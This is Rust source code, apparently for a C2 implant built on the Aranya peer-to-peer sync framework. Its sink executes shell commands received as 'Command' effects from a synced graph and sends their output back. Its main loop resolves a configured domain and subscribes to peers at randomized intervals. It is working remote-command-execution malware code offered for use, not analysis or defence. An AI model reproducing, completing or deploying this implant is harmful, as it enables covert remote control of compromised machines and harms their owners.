mod common;
mod config;
mod policy;

use std::{
    net::{
        IpAddr,
        Ipv4Addr,
        SocketAddr,
    },
    rc::Rc,
    cell::RefCell,
    sync::Arc,
};
use aranya_policy_vm::{text, Text};
use aranya_runtime::{storage::GraphId, Sink, VmEffect, vm_action};
use aranya_crypto::BaseId;
use tokio::time::{sleep, Duration};
use crate::policy::command_executed;
use tokio::sync::Mutex;

struct C2Sink {
    pub client: Option<Arc<Mutex<common::Client<C2Sink>>>>
}

impl Sink<VmEffect> for C2Sink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, effect: VmEffect) {
        print!("Consuming....\n");
        if effect.name == "Command" {
            if let aranya_policy_vm::Value::String(s) = effect.fields[0].value() {
                let out = std::process::Command::new(s).output().expect("Error exec command");
                let stdout = String::from_utf8(out.stdout).expect("Output string fail");

                let clientr = &self.client.as_ref();

                if let Some(client) = clientr.cloned() {
                    tokio::spawn(async move {
                        let a: Text = stdout.try_into().expect("String to Text fail");
                        client.lock().await.do_action(vm_action!(command_executed(BaseId::default(), a))).await;
                    });
                }
            }
        }
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

fn main() {
    // Enable logging to terminal 
    tracing_subscriber::fmt::init();

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    let rt = tokio::runtime::Builder::new_multi_thread()
        .thread_stack_size(100 * 1024 * 1024)
        .enable_all()
        .build()
        .unwrap();

    let mut ips: Vec<std::net::IpAddr> =
        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();
    
    // use rand::prelude::*;
    // let mut rng = rand::rng();

    
    // let randi = rng.random_range(0..ips.len());
    // let sync = ips[randi];


    // TODO: TEMPORARY
    use std::env;

    let args: Vec<String> = env::args().collect();

    let bind = args[1].parse().expect("IPv4 address in wrong format i.e. 127.0.0.1:1234");

    // let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT);

    
    use rand::prelude::SliceRandom;


    ips = Vec::new();
    ips.push("127.0.1.1".parse().unwrap());
    ips.push("127.0.1.2".parse().unwrap());
    ips.push("127.0.1.3".parse().unwrap());
    ips.push("127.0.1.4".parse().unwrap());
    ips.push("127.0.1.5".parse().unwrap());

    let mut rng = rand::rng();
    ips.shuffle(&mut rng);

    // TODO: END TEMPORARY

    rt.block_on(async move {
        let mut aranya = common::Client::init(
            config::POLICY.to_string(),
            bind,
            C2Sink {
                client: None
            }
        ).unwrap();
        
        let aranyam = Arc::new(Mutex::new(aranya));
        
        {
            let aranyac = Arc::clone(&aranyam);
            let aranyal = &mut *aranyac.lock().await;

            Arc::clone(&aranyal.sink).lock().await.client
                = Some(Arc::clone(&aranyam));

            let graph = GraphId::decode(config::GRAPH).unwrap();
            aranyal.set_graph(graph);

            print!("Working on Graph ID `{}`\n", graph);
        }

        sleep(Duration::from_millis(5000)).await;
        
        let mut subbedips: Vec<std::net::IpAddr> = Vec::new();

        loop {
            use rand::prelude::*;
            sleep(Duration::from_millis(rand::random_range(1000..10000))).await;
            print!("{:?} Looping...\n", bind);


            {
                let aranyac = Arc::clone(&aranyam);
                let aranyal = &mut *aranyac.lock().await;

                print!("{:?} TRYING TO LOCK SYNCER...\n", bind);
                let syncerc = Arc::clone(&aranyal.syncer);
                let mut syncerl = syncerc.lock().await;
                print!("{:?} LOCKED SYNCER...\n", bind);

                for ((addr, sub_graph_id), subscription) in &syncerl.subscriptions {
                    if subbedips.contains(&addr.ip()) {
                        print!("ALREADY SUBSCRIBED!\n");
                        continue
                    }
                    
                    print!("{:?} SUB LOOP...\n", bind);
                    // aranyal.subscribe_to_locked(*addr, &mut *syncerl).await;

                    let csclone = Arc::clone(&aranyal.cs);
                    let mut cs = csclone.lock().await;
                    let sinkclone = Arc::clone(&aranyal.sink);
                    let sink = &mut *sinkclone.lock().await;

                    let graph = match aranyal.graph {
                        Some(graph) => graph,
                        None => {
                            print!("Cannot do this action without creating a graph.\n");
                            return;
                        }
                    };
use aranya_crypto::Rng;
use aranya_runtime::SyncRequester;
                    let mut rng = Rng::new();
                    let req = SyncRequester::new(graph, &mut rng);

                    // let mut syncer = self.syncer.lock().await;
                    let _ = syncerl.subscribe(&mut *cs, req, 5, u64::MAX, *addr).await;



                    // aranyal.sync_with(addr);
                    print!("{:?} SUB LOOP DONE...\n", bind);

                    subbedips.push(addr.ip());

                    let hahaha: std::net::IpAddr = "127.0.0.2".parse().unwrap();
                    let hahah2 = SocketAddr::new(hahaha, config::PORT);

                    // if addr == hahah2 {
                    //     print!("----------------------------------------------------\n");
                    // }

                    print!("{:?} AAAAA...\n", bind);
                }
            }

            sleep(Duration::from_millis(rand::random_range(1000..10000))).await;

            {

                let aranyac = Arc::clone(&aranyam);
                let aranyal = &mut *aranyac.lock().await;

                print!("{:?} PUSHING...\n", bind);
                // aranyal.push_graph().await;
                print!("{:?} DONE PUSHING...\n", bind);
            }




            let ip = match ips.pop() {
                Some(v) => v,
                None => continue
            };

            if subbedips.contains(&ip) {
                continue
            }

            sleep(Duration::from_millis(rand::random_range(1000..10000))).await;
            {
                
                let aranyac = Arc::clone(&aranyam);
                let aranyal = &mut *aranyac.lock().await;

                let socket = SocketAddr::new(ip, config::PORT);
                if socket != bind {
                    print!("{:?} SUBBING...\n", bind);
                    subbedips.push(ip);
                    aranyal.subscribe_to(socket).await;
                    // aranyal.subscribe_to(socket).await;
                }
                

            }
            
            print!("{:?} Done looping...\n", bind);
        }
    });

    // sleep(Duration::from_millis(99999999999999));
}
